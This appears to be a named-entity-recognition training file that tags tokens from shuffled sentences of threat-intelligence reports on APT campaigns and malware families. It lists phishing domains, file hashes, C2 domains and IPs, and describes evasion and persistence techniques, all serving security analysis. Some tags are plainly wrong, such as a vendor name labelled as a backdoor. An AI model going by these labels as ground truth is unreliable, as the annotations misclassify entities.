CynthiaRNickerson(at)india.com	B-url.unknown
12/12/16	O
dedgesuite(.)net	B-url.unknown
KatherineKTaggart(at)india.com	B-url.unknown
12/12/16	O
wdsupdates(.)com	B-url.unknown
GordonESlavin(at)india.com	B-url.unknown
12/12/16	O
nsatcdns(.)com	B-url.unknown
SarahNBosch(at)india.com	B-url.unknown
12/13/16	O
vscue(.)com	B-url.unknown
ChrisTDawkins(at)india.com	B-url.unknown
12/13/16	O
sindeali(.)com	B-url.unknown
DonnaJMcCray(at)india.com	B-url.unknown
12/13/16	O
vmmini(.)com	B-url.unknown
RaymondRKimbrell(at)india.com	B-url.unknown
12/20/16	O
u-tokyo-ac-jp(.)com	B-url.unknown
LynnJOwens(at)india.com	B-url.unknown
12/21/16	O
meiji-ac-jp(.)com	B-url.unknown
PearlJPoole(at)india.com	B-url.unknown
12/26/16	O
jica-go-jp(.)bike	B-url.unknown
AliceCLopez(at)india.com	B-url.unknown
12/27/16	O
mofa-go-jp(.)com	B-url.unknown
AngelaJBirkholz(at)india.com	B-url.unknown
12/27/16	O
jimin-jp(.)biz	B-url.unknown
EsmeraldaTYates(at)india.com	B-url.unknown
12/27/16	O
jica-go-jp(.)biz	B-url.unknown
RonaldSFreeman(at)india.com	B-url.unknown
2/9/17	O
jpcert(.)org	B-url.unknown
GinaKPiller(at)india.com	B-url.unknown
2/14/2017	O
ijica(.)in	B-url.unknown
DarrenMCrow(at)india.com	B-url.unknown
2/17/2017	O
chibashiri(.)com	B-url.unknown
WitaTBiles(at)india.com	B-url.unknown
2/17/2017	O
essashi(.)com	B-url.unknown
CarlosBPierson(at)india.com	B-url.unknown
2/17/2017	O
urearapetsu(.)com	B-url.unknown
IvoryDStallcup(at)india.com	B-url.unknown

Alliance	O
for	O
True	O
Democracy	O
â	O
€	O
'	O
Hong	O
Kong	O

Figure	O
1	O
:	O
RIPTIDE	B-malware.backdoor
HTTP	O
GET	O
Request	O
Example	O

Furthermore	O
,	O
and	O
also	O
documented	O
by	O
Contextis	O
,	O
DarkComet	B-malware.backdoor
supports	O
the	O
use	O
of	O
an	O
optional	O
password	O
that	O
is	O
appended	O
to	O
the	O
default	O
(	O
version-specific	O
)	O
crypto	O
key	O
.	O

Moreover	O
,	O
this	O
group	O
has	O
connections	O
with	O
the	O
infamous	O
BlackEnergy	O
group	O
that	O
was	O
responsible	O
for	O
the	O
December	O
2015	O
power	O
outages	O
in	O
Ukraine	O
.	O

The	O
group	O
behind	O
the	O
Carberp	O
banking	O
Trojan	O
were	O
arrested	O
http://www.techweekeurope.co.uk/news/carberp-botnet-leader-arrested-112205	B-url.unknown
,	O
the	O
author	O
of	O
Zeus	O
retired	O
,	O
http://krebsonsecurity.com/2010/10/spyeye-v-zeus-rivalry-ends-in-quiet-merger/	B-url.unknown
,	O
the	O
author	O
of	O
SpyEye	O
went	O
into	O
hiding	O
http://www.xylibox.com/2012/03/behind-spyeye-gribodemon.html	B-url.unknown
and	O
was	O
recently	O
arrested	O
http://www.wired.com/threatlevel/2014/01/spy-eye-author-guilty-plea/	B-url.unknown
,	O
FBI	O
and	O
Microsoft	O
have	O
gone	O
after	O
Citadel	O
which	O
is	O
not	O
off	O
the	O
market	O
https://blogs.rsa.com/citadels-steward-banned-from-undergorund-venues/	B-url.normal
http://www.microsoft.com/en-us/news/press/2013/jun13/06-05dcupr.aspx	B-url.normal
and	O
an	O
overview	O
of	O
the	O
'	O
Big	O
4	O
'	O
banking	O
Trojans	B-malware.backdoor
http://blog.kaspersky.com/the-big-four-banking-trojans/	B-url.unknown
3	O
.	O

New	O
tools	O
used	O
to	O
compromise	O
networks	O

However	O
,	O
process	O
hooking	O
and	O
injection	O
can	O
only	O
affect	O
32-bit	O
processes	O
due	O
to	O
the	O
bitness	O
of	O
the	O
implant	O
itself	O
.	O

The	O
domain	O
horizons-tourisme.com	B-url.normal
is	O
a	O
legitimate	O
website	O
,	O
operated	O
by	O
an	O
Algerian	O
travel	O
agency	O
,	O
located	O
in	O
Algiers	O
,	O
Algeria	O
.	O

SERVER	O

Below	O
is	O
a	O
list	O
of	O
samples	O
which	O
have	O
used	O
the	O
site	O
:	O
MD5	O
hash	O
Filename	O
File	O
Info	O
First	O
seen	O
Origin	O
4cc10ab3f4ee6769e520694a10f611d5	B-hash
cambio.xap	O
(	O
73	O
KB	O
)	O
cb52c013f7af0219d45953bae663c9a2	B-hash
svchost.exe	O
Win32	O
EXE	O
(	O
126	O
KB	O
)	O
2016-10-07	O
03:09:43	O
2016-10-24	O
12:10:33	O
1f7897b041a812f96f1925138ea38c46	B-hash
gpsvc.exe	O
911de8d67af652a87415f8c0a30688b2	B-hash
gpsvc.exe	O
Win32	O
EXE	O
(	O
126	O
KB	O
)	O
2016-10-27	O
14:29:58	O
Win32	O
EXE	O
(	O
126	O
KB	O
)	O
2016-10-28	O
11:50:15	O
1507e7a741367745425e0530e23768e6	B-hash
gpsvc.exe	O
Win32	O
EXE	O
(	O
126	O
KB	O
)	O
2016-11-15	O
18:20:34	O
The	O
last	O
4	O
samples	O
can	O
loosely	O
be	O
categorised	O
as	O
the	O
same	O
malware	O
variant	O
,	O
however	O
the	O
first	O
sample	O
appears	O
to	O
be	O
a	O
separate	O
exploit	O
(	O
as	O
detailed	O
later	O
)	O
.	O

The	O
Telegraph	O
.	O

The	O
malware	O
author	O
uses	O
a	O
versioning	O
system	O
starting	O
by	O
the	O
G	O
letter	O
.	O

All	O
rights	O
reserved	O
.	O

Palestinian	O
baits	O
:	O

IRONGATE	B-malware.backdoor
's	O
characteristics	O
lead	O
us	O
to	O
conclude	O
that	O
it	O
is	O
a	O
test	O
,	O
proof	O
of	O
concept	O
,	O
or	O
research	O
activity	O
.	O

Four	O
of	O
the	O
droppers	O
(	O
update.exe	B-malware.drop
,	O
and	O
update.exe	B-malware.drop
)	O
detect	O
Cuckoo	O
environments	O
by	O
scanning	O
subdirectories	O
of	O
the	O
%	O
SystemDrive	O
%	O
.	O

This	O
technique	O
doubles	O
the	O
amount	O
of	O
data	O
needed	O
for	O
the	O
string	O
.	O

Important	O
note	O
:	O
we	O
do	O
not	O
believe	O
that	O
CloudMe	O
is	O
in	O
any	O
way	O
related	O
to	O
the	O
Cloud	B-malware.unknown
Atlas	I-malware.unknown
group	O
-	O
the	O
attackers	O
simply	O
create	O
free	O
accounts	O
on	O
this	O
provider	O
and	O
abuse	O
them	O
for	O
command-and-control	O
)	O
.	O

Because	O
the	O
obfuscation	O
makes	O
use	O
of	O
native	O
functions	O
in	O
PowerShell	O
,	O
the	O
script	O
can	O
run	O
in	O
an	O
obfuscated	O
state	O
and	O
work	O
correctly	O
.	O

These	O
commands	O
are	O
as	O
follows	O
:	O

MD5	O
hash	O
:	O
b3a9e6548fb3cc511096af4d68b2e745	B-hash

In	O
2017	O
,	O
social	O
engineering	O
content	O
in	O
lures	O
used	O
by	O
the	O
actor	O
provided	O
evidence	O
that	O
they	O
were	O
likely	O
used	O
to	O
target	O
members	O
of	O
the	O
Vietnam	O
diaspora	O
in	O
Australia	O
as	O
well	O
as	O
government	O
employees	O
in	O
the	O
Philippines	O
.	O

DerusbiThread	O
:	O
:DerusbiThread	O
binds	O
to	O
the	O
specified	O
port	O
and	O
opens	O
the	O
port	O
as	O
a	O
listener	O
.	O

Here	O
is	O
an	O
overview	O
of	O
intrusions	O
investigated	O
by	O
FireEye	O
that	O
are	O
attributed	O
to	O
APT32	B-malware.infosteal
:	O
In	O
2014	O
,	O
a	O
European	O
corporation	O
was	O
compromised	O
prior	O
to	O
constructing	O
a	O
manufacturing	O
facility	O
in	O
Vietnam	O
.	O

The	O
value	O
of	O
AT	O
is	O
'	O
<	O
host_name+OS	O
&	O
MD	O
>	O
=	O
<	O
list	O
of	O
folders	O
found	O
>	O
'	O
.	O

Obviously	O
,	O
the	O
directory	O
belonging	O
to	O
Babar	B-malware.drop
is	O
'	O
bb28	O
'	O
.	O

getInstalledAPP	O

Figure	O
4	O
.	O

In	O
older	O
phishing	O
emails	O
that	O
link	O
to	O
the	O
tools	O
used	O
by	O
DragonOK	B-malware.infosteal
and	O
Moafee	B-malware.infosteal
,	O
we	O
observed	O
an	O
implant	O
over	O
10	O
megabytes	O
in	O
size	O
.	O

Web	O
.	O

Backdoor	O
execution	O
flow	O

Outcome	O

Figure	O
9	O
:	O
Persistence	O
Keys	O

Logs	O
are	O
encrypted	O
using	O
the	O
following	O
static	O
AES	O
key	O
:	O
Ss	O
)	O
4	O
:	O
WKsRr	O
(	O
3/VJrQq&2.UIqPp%1-THp	O
.	O

Lazarus	O
,	O
the	O
prime	O
suspects	O
,	O
have	O
been	O
busy	O
nonetheless	O
–	O
targeting	O
Bitcoin	O
in	O
various	O
ways	O
,	O
as	O
well	O
as	O
other	O
intrusions	O
into	O
banks	O
such	O
as	O
in	O
Poland	O
and	O
Mexico	O
(	O
albeit	O
without	O
evidence	O
of	O
targeting	O
payment	O
systems	O
)	O
.	O

There	O
is	O
another	O
function	O
called	O
-	O
the	O
malware	O
creates	O
a	O
string	O
containing	O
computer	O
and	O
user	O
names	O
but	O
this	O
is	O
n't	O
used	O
anywhere	O
.	O

The	O
first	O
part	O
contains	O
'	O
doha	O
'	O
,	O
which	O
is	O
the	O
capital	O
of	O
Qatar	O
.	O

Detections	O
have	O
been	O
created	O
and	O
deployed	O
to	O
protect	O
customers	O
using	O
the	O
ICEBRG	O
platform	O
.	O

Within	O
this	O
command	O
several	O
things	O
are	O
happening	O
:	O
1	O
.	O

This	O
executable	O
decrypts	O
its	O
resource	O
using	O
the	O
AES	O
algorithm	O
with	O
CBC	O
mode	O
via	O
the	O
Windows	O
API	O
.	O

This	O
executable	O
would	O
contain	O
another	O
PE32	O
binary	O
as	O
an	O
embedded	O
PE	O
resource	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
code	O
that	O
creates	O
the	O
XML	O
file	O
Below	O
screen	O
shot	O
shows	O
the	O
XML	O
file	O
populated	O
with	O
the	O
user	O
name	O
and	O
the	O
password	O
which	O
is	O
used	O
by	O
the	O
malware	O
to	O
communicate	O
with	O
the	O
C2	O
server	O
.	O

Commands	O
used	O
for	O
downloading	O
and	O
executing	O
,	O
and	O
running	O
a	O
command	O
in	O
terminal	O
Figure	O
29	O
.	O

(	O
Translated	O
by	O
Yukako	O
Uchida	O
)	O
Microsoft	O
-	O
Reverse-engineering	O
DUBNIUM	O
https://blogs.technet.microsoft.com/mmpc/2016/06/09/reverse-engineering-dubnium-2/	B-url.normal

PCC_PROXY	O
:	O
:fShutdown	O
flag	O
is	O
set	O
.	O

If	O
so	O
,	O
the	O
response	O
object	O
has	O
its	O
End	O
(	O
)	O
method	O
invoked	O
,	O
denying	O
the	O
user	O
access	O
.	O

Consisting	O
of	O
a	O
180	O
byte	O
data	O
structure	O
(	O
Figure	O
3	O
)	O
,	O
the	O
server	O
variant	O
provides	O
the	O
client	O
with	O
a	O
variety	O
of	O
details	O
about	O
the	O
victim	O
's	O
machine	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
code	O
that	O
makes	O
this	O
request	O
.	O

This	O
time	O
attackers	O
execute	O
third-party	O
utilities	O
such	O
as	O
openssl	O
in	O
order	O
to	O
encrypt	O
files	O
.	O

In	O
conclusion	O
,	O
this	O
is	O
the	O
first	O
stage	O
payload	O
with	O
more	O
of	O
reconnaissance	O
purpose	O
and	O
it	O
will	O
trigger	O
next	O
stage	O
attack	O
only	O
when	O
it	O
decides	O
the	O
environment	O
is	O
safe	O
enough	O
for	O
attack	O
.	O

Wo	O
n't	O
install	O
persistence	O
if	O
Qhioo360	O
(	O
popular	O
Chinese	O
AV	O
)	O
is	O
found	O

Overview	O
.............................................................................................................................	O
2	O
McAfee	O
detection	O
names	O
for	O
Aurora	B-malware.infosteal
...................................................................................	O
3	O
Exploit-Comele	O
...........................................................................................................	O
3	O
Roarur.dr	O
.....................................................................................................................	O
3	O
Roarur.dll	O
....................................................................................................................	O
3	O
Symptoms	O
...........................................................................................................................	O
5	O
Characteristics	O
.....................................................................................................................	O
5	O
Common	O
filenames	O
and	O
hashes	O
...........................................................................................	O
6	O
McAfee	O
product	O
coverage	O
for	O
Aurora	B-malware.infosteal
.................................................................................	O
7	O
Common	O
URLs	O
accessed	O
..................................................................................................	O
10	O
Appendix	B-url.unknown
A	O
:	O
Useful	O
URLs	O
related	O
to	O
Aurora	B-malware.infosteal
...................................................................	O
11	O
'	O
Operation	O
Aurora	B-malware.infosteal
,	O
'	O
released	O
the	O
week	O
of	O
January	O
11	O
,	O
exploits	O
the	O
recent	O
Microsoft	O
Internet	O
Explorer	O
vulnerability	O
.	O

The	O
document	O
was	O
uploaded	O
from	O
an	O
IP	O
address	O
in	O
Qatar	O
to	O
VirusTotal	O
on	O
May	O
31	O
,	O
2018	O
.	O

Rdata	O
results	O
for	O
ANY/176.56.238.177	B-ip.unknown
techto-earth[.]com	B-url.cncsvr
.	O

s2.send	O
(	O
encode	O
(	O
cmd	O
)	O
+'\x00	O
'	O
)	O
60	O
.	O

These	O
indicators	O
along	O
with	O
command	O
and	O
control	O
domain	O
names	O
and	O
the	O
IP	O
addresses	O
that	O
they	O
resolve	O
to	O
can	O
be	O
used	O
to	O
cluster	O
and	O
track	O
this	O
activity	O
over	O
time	O
.	O

It	O
appeared	O
to	O
be	O
geared	O
exclusively	O
towards	O
high	O
profile	O
targets	O
.	O

Sofacy	O
's	O
reported	O
presence	O
in	O
the	O
DNC	O
network	O
alongside	O
APT29	O
brought	O
possibly	O
the	O
highest	O
level	O
of	O
public	O
attention	O
to	O
the	O
group	O
's	O
activities	O
in	O
2016	O
,	O
especially	O
when	O
data	O
from	O
the	O
compromise	O
was	O
leaked	O
and	O
'	O
weaponized	O
'	O
.	O

MD5	O
hash	O
Filename	O
File	O
Info	O
First	O
seen	O
Origin	O
85d316590edfb4212049c4490db08c4b	B-hash
gpsvc.exe	B-malware.drop
Win32	O
(	O
736	O
KB	O
)	O
2017-01-26	O
07:46:24	O
The	O
file	O
is	O
packed	O
with	O
a	O
commercial	O
packer	O
known	O
as	O
'	O
Enigma	O
Protector	O
'	O
.	O

The	O
encrypted	O
IP	O
address	O
is	O
'	O
127.0.0.2	B-ip.unknown
'	O
(	O
used	O
as	O
loopback	O
)	O
and	O
no	O
connection	O
is	O
made	O
on	O
that	O
IP	O
address	O
(	O
due	O
to	O
the	O
listening	O
variable	O
set	O
to	O
1	O
)	O
.	O

supports	O
five	O
commands	O
:	O
Connect	O
to	O
Specified	O
Endpoint	O
(	O
Creates	O
New	O
Channel	O
)	O
Send	O
Data	O
to	O
Endpoint	O
Terminate	O
Channel	O
Enable	O
Network	O
Tunneling	O
(	O
Disable	O
Network	O
Tunneling	O
(	O
The	O
administrative	O
commands	O
are	O
built-in	O
to	O
the	O
server	O
variant	O
and	O
are	O
not	O
derived	O
from	O
the	O
class	O
.	O

At	O
the	O
beginning	O
of	O
the	O
ExPetr	O
outbreak	O
,	O
one	O
of	O
our	O
team	O
members	O
pointed	O
to	O
the	O
fact	O
that	O
the	O
specific	O
list	O
of	O
extensions	O
used	O
by	O
ExPetr	O
is	O
very	O
similar	O
to	O
the	O
one	O
used	O
by	O
BlackEnergy	O
's	O
KillDisk	B-malware.ransom
ransomware	O
from	O
2015	O
and	O
2016	O
(	O
Anton	O
Cherepanov	O
from	O
ESET	O
made	O
the	O
same	O
observation	O
on	O
Twitter	O
)	O
.	O

HTTP	O
GET	O
Request	O

This	O
file	O
contains	O
a	O
list	O
of	O
IP	O
addresses	O
for	O
the	O
infected	O
machine	O
to	O
connect	O
back	O
to	O
.	O

The	O
malware	O
notifies	O
the	O
remote	O
C	O
&	O
C	O
each	O
hour	O
of	O
events	O
,	O
sending	O
'	O
--	O
-O	O
'	O
if	O
the	O
'	O
Login	O
'	O
(	O
open	O
)	O
event	O
occurred	O
,	O

Both	O
of	O
these	O
IP	O
addresses	O
is	O
associated	O
with	O
hosting	O
provider	O
in	O
Germany	O
as	O
shown	O
in	O
the	O
screen	O
shots	O
below	O
.	O

13	O
May	O
2016	O
.	O

processname	O
:	O
screenassistantd	O

The	O
domain	O
at	O
the	O
time	O
of	O
this	O
report	O
resolved	O
to	O
the	O
IP	O
address	O
,	O
'	O
103.229.125.157	B-ip.unknown
'	O
.	O

PowerShell	O
Cobalt	O
Strike	O
Beacon	O
–	O
New	O
payload	O
+	O
new	O
C2	O
domain	O

안랩	O
,	O
'	O
검은	O
광산	O
작전'의	O
비밀을	O
'	O
캐내다	O
'	O
http://www.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?curPage=&menu_dist=1&seq=24229	O
지속적인	O
방위산업체	O
공격	O
시도	O
,	O
왜	O
?	O

In	O
versions	O
3.22	O
and	O
3.39	O
the	O
routine	O
changes	O
.	O

Process	O
Explorer	O
Keystroke	O
Logger	O
Web	O
Cam	O
Eavesdropping	O
Voice	O
Monitoring	O
Session	O
Management	O
Remote	O
File	O
Downloads	O
Remote	O
Terminal	O
File	O
Manager	O

It	O
is	O
designed	O
to	O
exist	O
in	O
the	O
infected	O
computer	O
memory	O
and	O
is	O
never	O
written	O
to	O
the	O
computer	O
's	O
physical	O
disk	O
itself	O
.	O

The	O
exploitation	B-malware.backdoor
process	I-malware.backdoor
,	O
detailed	O
in	O
Figure	O
1	O
,	O
begins	O
by	O
downloading	O
and	O
executing	O
a	O
remote	O
Shockwave	O
Flash	O
(	O
SWF	O
)	O
file	O
.	O

Second	O
,	O
we	O
summarize	O
the	O
results	O
of	O
the	O
analysis	O
of	O
the	O
Talos	O
dataset	O
.	O

Outlook	B-malware.backdoor
backdoors	O
are	O
not	O
a	O
new	O
concept	O
and	O
have	O
been	O
observed	O
in	O
different	O
APTs	O
in	O
the	O
past	O
.	O

Hypothesis	O
5	O
:	O
Indian	O
entities	O
actively	O
sought	O
and	O
utilized	O
the	O
services	O
of	O
Pakistan	O
based	O
information	O
security	O
company	O
,	O
Tranchulas	O
,	O
for	O
an	O
officially	O
sanctioned	O
and	O
authorized	O
penetration	O
test	O
.	O

Unlike	O
JRat	B-malware.backdoor
,	O
Bandook	B-malware.unknown
is	O
only	O
able	O
to	O
target	O
Windows	O
computers	O
.	O

It	O
will	O
then	O
concatenate	O
the	O
whole	O
string	O
and	O
will	O
use	O
a	O
hash	O
algorithm	O
to	O
get	O
the	O
hash	O
out	O
of	O
it	O
.	O

The	O
attackers	O
used	O
the	O
open-source	O
tool	O
Invoke-PSImage	O
,	O
released	O
December	O
20	O
,	O
to	O
embed	O
the	O
PowerShell	O
script	O
into	O
the	O
image	O
 le	O
.	O

Through	O
the	O
statistical	O
analysis	O
of	O
the	O
vulnerability	O
samples	O
,	O
we	O
found	O
out	O
that	O
obfuscation	O
was	O
used	O
massively	O
.	O

Awareness	O
can	O
effectively	O
mitigate	O
or	O
stop	O
these	O
kinds	O
of	O
attacks	O
from	O
being	O
successful	O
.	O

Most	O
of	O
the	O
times	O
the	O
perpetrators	O
remain	O
unknown	O
even	O
after	O
months	O
of	O
work	O
by	O

Actions	O
to	O
Take	O
Using	O
Indicators	O

Cylance	O
determined	O
that	O
the	O
'	O
Ghost	O
Dragon	O
'	O
group	O
utilized	O
specifically	O
tailored	O
variants	O
of	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
,	O
which	O
the	O
group	O
modified	O
from	O
the	O
3.6	O
version	O
of	O
the	O
source	O
code	O
released	O
in	O
2008	O
.	O

HARACTERISTICS	O
OF	O
OBALT	O
TRIKE	O
................................................................................................................	O
11	O

messages	O
can	O
be	O
used	O
on	O
their	O
own	O
,	O
or	O
can	O
be	O
coupled	O
with	O
a	O
cover	O
message	O
;	O
is	O
used	O
to	O
order	O
the	O
movement	O
of	O
funds	O
to	O
the	O
beneficiary	O
institution	O
via	O
another	O
financial	O
institution/Intermediary	O
Bank	O
.	O

29	O
Dec	O
.	O

Despite	O
the	O
fact	O
that	O
the	O
vulnerability	O
used	O
is	O
not	O
a	O
new	O
one	O
,	O
the	O
malware	O
does	O
not	O
have	O
the	O
common	O
features	O
that	O
we	O
saw	O
during	O
other	O
targeted	O
attack	O
campaigns	O
.	O

This	O
HTRAN	O
client	O
was	O
seen	O
attempting	O
to	O
connect	O
to	O
three	O
different	O
HTRAN	O
servers	O
located	O
in	O
the	O
Jiangsu	O
province	O
and	O
operated	O
by	O
CHINANET	O
.	O

The	O
extortion	O
elements	O
of	O
this	O
campaign	O
are	O
what	O
set	O
it	O
apart	O
from	O
others	O
.	O

We	O
believe	O
the	O
current	O
CozyDuke	B-malware.drop
activity	O
started	O
at	O
the	O
end	O
of	O
January	O
2015	O
.	O

A	O
version.txt	O
file	O
is	O
also	O
requested	O
by	O
the	O
malware	O
.	O

The	O
malicious	O
batch	O
scripts	O
,	O
along	O
with	O
the	O
downloader	O
tool	O
,	O
are	O
dropped	O
in	O
the	O
%	O
systemroot	O
%	O
\\temp	O
folder	O
.	O

Information	O
about	O
known	O
phishing	O
attacks	O
is	O
also	O
available	O
online	O
from	O
groups	O
such	O
as	O
the	O
Anti-Phishing	O
Working	O
Group	O
(	O
http://www.antiphishing.org	B-url.normal
)	O
.	O

Whilst	O
this	O
is	O
a	O
feature	O
Microsoft	O
provide	O
it	O
is	O
also	O
a	O
feature	O
that	O
an	O
attacker	O
can	O
leverage	O
for	O
malicious	O
activity	O
,	O
Microsoft	O
published	O
mitigation	O
information	O
here	O
previously	O
.	O

Before	O
execution	O
,	O
the	O
malware	O
makes	O
a	O
couple	O
of	O
checks	O
to	O
avoid	O
analysis	O
,	O
including	O
checking	O
for	O
the	O
presence	O
of	O
a	O
debugger	O
using	O
IsDebuggerPresent	O
as	O
well	O
as	O
checking	O
for	O
the	O
presence	O
of	O
VirtualBox	O
by	O
looking	O
for	O
the	O
device	O
name	O
\\.\VBoxMiniRdrDN	O
:	O
The	O
malware	O
also	O
checks	O
for	O
the	O
presence	O
of	O
several	O
anti­virus	O
solutions	O
,	O
as	O
well	O
for	O
any	O
processes	O
including	O
the	O
word	O
'	O
security	O
'	O
:	O
The	O
malware	O
then	O
proceeds	O
to	O
decrypt	O
some	O
basic	O
configuration	O
data	O
,	O
including	O
the	O
command	O
&	O
control	O
domain	O
,	O
and	O
information	O
about	O
the	O
origin	O
of	O
the	O
infection	O
,	O
tracked	O
via	O
ID	O
:	O
Meanwhile	O
,	O
the	O
malware	O
begins	O
calling	O
home	O
,	O
whilst	O
also	O
keeping	O
a	O
log	O
of	O
its	O
actions	O
in	O
a	O
plaintext	O
file	O
that	O
is	O
created	O
in	O
the	O
same	O
folder	O
as	O
where	O
the	O
binary	O
was	O
executed	O
from	O
.	O

Judging	O
from	O
historical	O
patterns	O
,	O
the	O
businesses	O
likely	O
to	O
be	O
at	O
greatest	O
risk	O
are	O
in	O
many	O
of	O
the	O
same	O
sectors	O
that	O
were	O
victimized	O
by	O
Iranian	O
cyberattacks	O
between	O
2012	O
and	O
2014	O
and	O
include	O
banks	O
and	O
financial	O
services	O
,	O
government	O
departments	O
,	O
critical	O
infrastructure	O
providers	O
,	O
and	O
oil	O
and	O
energy	O
.	O

Apart	O
from	O
that	O
,	O
Babar	B-malware.drop
comes	O
with	O
a	O
userland	O
rootkit	O
component	O
which	O
applies	O
global	O
Windows	O
hooks	O
to	O
invade	O
all	O
processes	O
on	O
its	O
desktop	O
.	O

Once	O
it	O
is	O
executed	O
,	O
the	O
malware	O
ensures	O
its	O
persistence	O
by	O
setting	O
a	O
mutex	O
(	O
'	O
InterenetAssistantN	B-malware.infosteal
'	O
)	O
,	O
copying	O
itself	O
to	O
the	O
'	O
ProgramData	O
'	O
directory	O
,	O
and	O
adding	O
itself	O
to	O
the	O
scheduled	O
tasks	O
.	O

The	O
dropper	O
will	O
then	O
proceed	O
to	O
write	O
the	O
CozyDuke	B-malware.drop
components	O
to	O
the	O
specified	O
location	O
.	O

Cybereason	O
concludes	O
that	O
the	O
tactics	O
,	O
techniques	O
and	O
procedures	O
(	O
TTPs	O
)	O
observed	O
throughout	O
operation	O
Cobalt	O
Kitty	O
are	O
consistent	O
with	O
the	O
group	O
's	O
previous	O
APT	O
campaigns	O
in	O
Asia	O
.	O

During	O
that	O
time	O
,	O
12000	O
unique	O
IPs	O
connected	O
to	O
the	O
uranio2.no-ip.biz	B-malware.unknown
.	O

CSPs	O
then	O
use	O
the	O
cyber	O
threat	O
information	O
to	O
protect	O
CI	O
customers	O
.	O

2016	O
.	O

This	O
is	O
likely	O
to	O
be	O
the	O
initial	O
attack	O
point	O
.	O

Then	O
the	O
authors	O
use	O
that	O
information	O
to	O
tweak	O
the	O
sample	O
to	O
avoid	O
detection	O
in	O
future	O
sandbox	O
runs	O
through	O
various	O
evasion	O
tactics	O
.	O

The	O
command	O
string	O
to	O
trigger	O
the	O
download	O
functionality	O
is	O
extracted	O
from	O
the	O
C2	O
response	O
using	O
the	O
logic	O
shown	O
below	O
.	O

The	O
screenshot	O
on	O
the	O
left	O
is	O
from	O
a	O
version	O
currently	O
in	O
development	O
by	O
a	O
possible	O
attacker	O
,	O
the	O
corresponding	O
screenshot	O
on	O
the	O
right	O
is	O
from	O
a	O
public	O
article	O
.	O

Anonymous	O
Poland	O
(	O
@	O
anpoland	O
)	O
.	O

After	O
infection	O
the	O
dropper	O
executes	O
a	O
separate	O
command	O
line	O
through	O
spawning	O
a	O
cmd.exe	O
process	O
,	O
which	O
is	O
instructed	O
to	O
wait	O
for	O
1	O
second	O
before	O
deleting	O
the	O
dropper	O
binary	O
on	O
disk	O
.	O

29	O
Dec	O
.	O

While	O
we	O
have	O
identified	O
multiple	O
different	O
attacks	O
with	O
different	O
zip	O
files	O
,	O
the	O
structure	O
of	O
all	O
of	O
these	O
is	O
consistent	O
with	O
the	O
example	O
described	O
here	O
.	O

Once	O
the	O
payload	O
stub	O
is	O
decoded	O
,	O
it	O
represents	O
itself	O
as	O
a	O
PE-image	O
,	O
which	O
is	O
another	O
.NET	O
4.0	O
assembly	O
with	O
the	O
internal	O
name	O
binaryreader.dll	O
.	O

We	O
have	O
written	O
a	O
simple	O
C++	O
ZxShell	B-malware.backdoor
Server	O
that	O
implements	O
the	O
communication	O
and	O
the	O
handshake	O
for	O
the	O
version	O
3.10	O
and	O
3.20	O
of	O
the	O
ZxShell	B-malware.backdoor
DLL	O
.	O

Rita	O
,	O
the	O
petite	O
brunette	O
,	O
seems	O
to	O
be	O
interested	O
in	O
military	O
groups	O
,	O
and	O
a	O
Lebanese	B-malware.unknown
and	O
Israel	O
friendship	O
.	O

In	O
particular	O
Volexity	B-malware.backdoor
came	O
across	O
live	O
exploit	O
code	O
hosted	O
at	O

P.O	O
Box	O
11129-­‐00400	O
Nairobi	O
,	O
Kenya	O
www.dubai-­‐bank.co.ke	O
email	O
:	O
mary.alidu@dbcbank.com	O
remittance@dbcbank.com	O
Tel	O
:	O
(	O
+254	O
)	O
020	O
31109	O
+254-­‐66-­‐2112006	O
IMPORTANT	O
:	O
This	O
e-­‐mail	O
(	O
including	O
all	O
attachments	O
)	O
is	O
intended	O
solely	O
for	O
<	O
B=	O
the	O
use	O
of	O
individual	O
or	O
entity	O
to	O
whom	O
it	O
is	O
addressed	O
and	O
may	O
contain	O
confidential	O
and	O
privileged	O
information	O
.	O

The	O
fi	O
rst	O
payload	O
deployed	O
to	O
the	O
infected	O
system	O
is	O
a	O
self-extracting	O
7zip	O
archive	O
that	O
drops	O
a	O
set	O
of	O
miner	O
application	O
tools	O
for	O
Bitcoin	O
mining	O
.	O

Neither	O
Trend	O
Micro	O
nor	O
any	O
party	O
involved	O
in	O
creating	O
,	O
producing	O
,	O
or	O
delivering	O
this	O
document	O
shall	O
be	O
liable	O
for	O
any	O
consequence	O
,	O
loss	O
,	O
or	O
damage	O
,	O
including	O
direct	O
,	O
indirect	O
,	O
special	O
,	O
consequential	O
,	O
loss	O
of	O
business	O
profits	O
,	O
or	O
special	O
damages	O
,	O
whatsoever	O
arising	O
out	O
of	O
access	O
to	O
,	O
use	O
of	O
,	O
or	O
inability	O
to	O
use	O
,	O
or	O
in	O
connection	O
with	O
the	O
use	O
of	O
this	O
document	O
,	O
or	O
any	O
errors	O
or	O
omissions	O
in	O
the	O
content	O
thereof	O
.	O

It	O
has	O
been	O
developed	O
and	O
used	O
since	O
May	O
2015	O
by	O
Molerats	O
(	O
aka	O
'	O
Gaza	O
cybergang	O
'	O
)	O
,	O
a	O
terrorist	O
group	O
whose	O
main	O
objective	O
in	O
this	O
campaign	O
is	O
intelligence	O
gathering	O
.	O

Beacon	O
:	O
hxxp://dazqc4f140wtl.cloudfront[.]net/ZZYO	B-url.unknown

Ablyazov	O
and	O
his	O
supporters	O
have	O
characterized	O
this	O
move	O
as	O
a	O
'	O
kidnapping	O
'	O
and	O
'	O
political	O
hostage-taking	O
'	O
ordered	O
by	O
President	O
Nazabayev	O
.	O

However	O
,	O
key	O
actors	O
have	O
been	O
identifi	O
ed	O
in	O
association	O
with	O
malware	O
operations	O
that	O
utilize	O
Chinese	O
systems	O
and	O
native	O
language	O
malware	O
.	O

Overall	O
,	O
we	O
can	O
see	O
subtle	O
changes	O
,	O
which	O
indicate	O
that	O
the	O
threat	O
actors	O
behind	O
ANEL	B-malware.backdoor
are	O
making	O
incremental	O
improvements	O
to	O
the	O
malware	O
to	O
refine	O
it	O
.	O

When	O
the	O
aurora	B-malware.infosteal
innoculation	O
shot	O
is	O
executed	O
it	O
will	O
query	O
the	O
user	O
for	O
authentication	O
credentials	O
.	O

The	O
shellcode	O
decrypted	O
from	O
the	O
resource	O
is	O
executed	O
.	O

APT29	B-malware.backdoor
has	O
been	O
observed	O
crafting	O
targeted	O
spearphishing	O
campaigns	O
leveraging	O
web	O
links	O
to	O
a	O
malicious	O
dropper	O
;	O
once	O
